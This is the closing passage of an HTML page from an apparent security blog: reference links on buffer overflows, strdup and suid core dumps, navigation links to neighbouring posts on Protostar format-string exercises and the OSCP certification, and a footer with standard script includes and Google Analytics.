<li><a href="http://www.tenouk.com/cncplusplusbufferoverflow.html">Tenouk</a></li>
<li><a href="http://pubs.opengroup.org/onlinepubs/009695399/functions/strdup.html">strdup</a></li>
<li><a href="http://unix.stackexchange.com/questions/15531/how-come-no-core-dump-is-create-when-an-application-has-suid-set">Core dump suid binaries</a></li>
</ul>

    </div>
  </div>

  <ul class="pager">
    

    
      
        &nbsp;<li class="previous"><a href="http://camelinc.info/blog/2014/09/Exploit-Exercises---Protostar---Format-String-levels/"> Exploit Exercises - Protostar - Format String levels</a></li>
      
    
    
      
        &nbsp;<li class="next"><a href="http://camelinc.info/blog/2014/05/Offensive-Security-Certified-Professional/"> Offensive Security Certified Professional</a></li>
      
    
  </ul>



<footer>

  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>

  
  

  <script type="text/javascript" src="http://camelinc.info//js/jquery-2.1.4.js"></script>

  <script src="http://camelinc.info//js/bootstrap.min.js"></script>
  <script src="http://camelinc.info//js/bootstrap.js"></script>
  <script type="text/javascript" src="http://camelinc.info//js/hc.js"></script>

  
  <script type="text/javascript" src="http://camelinc.info//lightbox/js/lightbox.js"></script>
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', "UA-83225898-1", 'auto');
    ga('send', 'pageview');
  </script>
  

  

</footer>

	</body>
</html>
